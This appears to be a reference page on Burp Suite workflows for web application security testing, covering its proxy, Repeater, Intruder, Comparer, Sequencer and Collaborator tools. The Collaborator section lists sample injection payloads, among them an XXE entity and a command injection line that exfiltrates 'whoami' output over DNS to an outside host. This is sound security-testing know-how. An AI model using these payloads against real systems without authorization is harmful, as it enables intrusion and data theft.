Burp Suite

The industry-standard integrated platform for web application security testing. Combines an intercepting proxy, manual HTTP replay engine (Repeater), automated fuzzer (Intruder), out-of-band testing (Collaborator), and an extensive BApp ecosystem.

Community Edition Limitations & Intruder Pitfalls
  • Community Edition throttles Intruder & lacks automated scanner: Automated fuzzing in Community Edition is throttled (~1 request/sec) and lacks the active scanner. Use Repeater for manual verification, or pipeline exported requests into fast CLI tools like ffuf or sqlmap.
  • Cluster Bomb multiplies payload lists exponentially: Two lists of 100 entries = 10,000 requests. Three lists of 100 = 1,000,000 requests. This can accidentally crash a target or trigger account lockouts. Always calculate len(A) × len(B) × … before launching.
  • CSRF tokens break Intruder: If the login form includes a per-request CSRF token or nonce, standard Intruder attacks fail because the token refreshes each time. Configure a session macro (Settings → Sessions → Macros) to re-fetch fresh tokens, or use Pitchfork with a synchronized token list.
  • Follow redirects creates false positives: In an interception proxy, following 301/302 redirects automatically conceals the original redirect response headers and bodies — hiding authentication bypasses, sensitive debug cookies, and leaked admin paths. Keep redirect following disabled by default.

Proxy & Match/Replace — Intercept & Modify Traffic

Burp listens on 127.0.0.1:8080 by default. Configure your browser or CLI tools to route traffic through this socket.
Launch via command line and route CLI tools
Start Burp headless or route individual CLI tools through the 127.0.0.1:8080 proxy listener.
$ java -jar burpsuite_community.jar
$ curl --proxy http://127.0.0.1:8080 -k https://target.com
CA Certificate setup (Linux & system trust)
Export and install the PortSwigger CA certificate to decrypt HTTPS traffic without browser TLS warnings.
$ # Download CA from http://127.0.0.1:8080/cert then install:
# openssl x509 -inform DER -in cacert.der -out /usr/local/share/ca-certificates/burp.crt && update-ca-certificates

Intercepting Responses
Burp does not intercept responses by default. Tamper with incoming server responses before the browser renders them.

To intercept a specific response (e.g. to modify a 403 Forbidden body, tamper with a 302 redirect location, or remove anti-CSRF JavaScript):

> Right-click request in Proxy HTTP history → Do intercept → Response to this request

To intercept all responses matching criteria, navigate to Proxy settings → Response interception rules and check "Intercept responses if...".

Repeater — Manual Request Testing

Repeater lets you replay, modify, and resend individual HTTP/S requests while inspecting server responses. It is the primary workshop for proving injection vulnerabilities, authorization bypasses (BOLA/IDOR), and parameter tampering.

Repeater Techniques & Analysis
High-efficiency workflows for diffing responses and retaining test history.
  • Response diffing: Right-click baseline response → Send to Comparer (Response), then resend with modified payload and right-click → Send to Comparer (Response). In Comparer, click Words to spot subtle reflections, status variations, or hidden error disclosures.
  • Request history navigation: Every click of "Send" is archived in that tab's memory. Press Ctrl+← and Ctrl+→ to jump between consecutive payloads and inspect which parameter permutation altered the server response.

Intruder automates customized attacks against web applications. Define insertion points with §payload§ markers and configure appropriate payload sets and attack strategies.

Grep-Match (Response Differentiation)
Differentiate successful hits when all responses return identical HTTP status codes or similar byte lengths.

Go to Intruder → Options → Grep - Match, clear defaults, and add strings indicating application state:

Throttling (Community & Live Targets)
Configure resource pools to prevent WAF bans, IP rate-limiting, and server lockouts.

In Community Edition, Intruder is throttled by design. On live production targets in Professional Edition, set Intruder → Resource Pool → Maximum concurrent requests to 4–8 with a 200–500ms delay between requests to avoid triggering automated WAF/fail2ban defenses.

Comparer & Sequencer — Diff & Entropy Analysis

Comparer: Word-by-Word & Byte-Level Diffing
Perform visual diffs between two responses or payloads to spot subtle vulnerabilities.

Workflow: Send two responses or requests to Comparer to spot hidden behavioral differences:

> Right-click response A → Send to Comparer → Right-click response B → Send to Comparer → Click "Words"

Ideal for diagnosing blind SQL injection boolean conditions, access control edge cases, and subtle timing variations.

Sequencer: Token Randomness & Entropy Analysis
Quantify the cryptographic randomness of session cookies, CSRF tokens, and password reset nonces.

Workflow: Test token predictability to reveal session hijacking risks:

  1. Right-click the HTTP request issuing the token → Send to Sequencer.
  2. In Sequencer → Live capture, verify the token location (e.g. Set-Cookie: PHPSESSID=...).
  3. Click Start live capture (Burp harvests 10,000+ sequential tokens) → Click Analyze now.
  4. Review the FIPS 140-2 statistical tests and effective entropy bit count.

Collaborator — Out-of-Band (OAST) Testing

Burp Collaborator is an out-of-band application security testing (OAST) server. It captures interactions triggered when target backends execute external DNS resolutions, HTTP requests, or SMTP connections without returning an in-band response.
Collaborator OAST Testing Workflow
Generate unique payloads, inject into target input vectors, and poll for out-of-band interactions.
  1. Go to the Collaborator tab → click Copy to clipboard (generates a unique subdomain like abc123xyz.oastify.com).
  2. Inject the payload into untrusted input fields, HTTP headers, or parameters:
    X-Forwarded-For: abc123xyz.oastify.com — Blind SSRF
    <!ENTITY xxe SYSTEM "http://abc123xyz.oastify.com"> — Blind XXE
    ; nslookup $(whoami).abc123xyz.oastify.com ; — Blind OS Command Injection / DNS Exfiltration
  3. Send the request from Repeater or Intruder.
  4. Switch back to Collaborator → click Poll now to inspect received DNS queries and HTTP connections.
OPSEC Notice: Community Edition routes through a public shared Collaborator server. Professional Edition supports private on-premise Collaborator instances for strict enterprise non-disclosure.
